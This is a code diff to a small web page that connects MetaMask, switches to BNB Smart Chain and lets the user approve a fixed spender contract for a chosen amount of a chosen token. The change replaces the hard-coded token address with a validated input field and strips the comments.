@@ -9,11 +9,12 @@
     <div id="status">Please connect to MetaMask</div>
     <button id="connectButton">Connect to MetaMask</button>
     <br><br>
+    <input type="text" id="tokenAddress" placeholder="Enter token address to approve" style="width: 300px;">
+    <br><br>
     <input type="text" id="amount" placeholder="Enter amount to approve">
     <button id="approveButton" disabled>Approve</button>
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const tokenA_address = "0x503Fa24B7972677F00C4618e5FBe237780C1df53";
         const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
         let signer;
 
@@ -25,10 +26,8 @@
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 if (accounts.length === 0) throw new Error('No accounts found');
-                // Get current chainId
                 const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
                 if (chainIdHex !== '0x38') {
-                    // Try to switch to BSC
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
@@ -36,7 +35,6 @@
                         });
                     } catch (switchError) {
                         if (switchError.code === 4902) {
-                            // Chain not added, add it
                             await window.ethereum.request({
                                 method: 'wallet_addEthereumChain',
                                 params: [{
@@ -51,7 +49,6 @@
                                     blockExplorerUrls: ['https://bscscan.com'],
                                 }],
                             });
-                            // After adding, switch to it
                             await window.ethereum.request({
                                 method: 'wallet_switchEthereumChain',
                                 params: [{ chainId: '0x38' }],
@@ -61,13 +58,11 @@
                         }
                     }
                 }
-                // Now, create provider with network configuration
                 const network = { chainId: 56, ensAddress: null };
                 const provider = new ethers.providers.Web3Provider(window.ethereum, network);
                 signer = provider.getSigner();
                 const address = await signer.getAddress();
                 document.getElementById('status').innerText = `Connected to account: ${address}`;
-                // Enable approve button
                 document.getElementById('approveButton').disabled = false;
             } catch (error) {
                 document.getElementById('status').innerText = `Connection failed: ${error.message}`;
@@ -76,28 +71,37 @@
         }
 
         async function approve() {
+            const tokenAddressInput = document.getElementById('tokenAddress').value;
             const amountInput = document.getElementById('amount').value;
+            
+            if (!tokenAddressInput || !ethers.utils.isAddress(tokenAddressInput)) {
+                document.getElementById('status').innerText = 'Please enter a valid token address';
+                return;
+            }
+            
             if (!amountInput || isNaN(amountInput) || Number(amountInput) <= 0) {
                 document.getElementById('status').innerText = 'Please enter a valid amount';
                 return;
             }
+            
             if (!signer) {
                 document.getElementById('status').innerText = 'Please connect to MetaMask first';
                 return;
             }
+            
             try {
-                const tokenA_address_checksum = ethers.utils.getAddress(tokenA_address);
+                const tokenAddress_checksum = ethers.utils.getAddress(tokenAddressInput);
                 const scB_address_checksum = ethers.utils.getAddress(scB_address);
-                const tokenAAbi = [
+                const tokenAbi = [
                     "function approve(address spender, uint256 amount) public returns (bool)",
                     "function decimals() public view returns (uint8)"
                 ];
-                const tokenAContract = new ethers.Contract(tokenA_address_checksum, tokenAAbi, signer);
-                const decimals = await tokenAContract.decimals();
+                const tokenContract = new ethers.Contract(tokenAddress_checksum, tokenAbi, signer);
+                const decimals = await tokenContract.decimals();
                 console.log('Decimals:', decimals);
                 const amount = ethers.utils.parseUnits(amountInput, decimals);
                 document.getElementById('status').innerText = 'Approving...';
-                const tx = await tokenAContract.approve(scB_address_checksum, amount);
+                const tx = await tokenContract.approve(scB_address_checksum, amount);
                 console.log('Transaction hash:', tx.hash);
                 await tx.wait();
                 document.getElementById('status').innerText = `Approval successful! Tx: ${tx.hash}`;
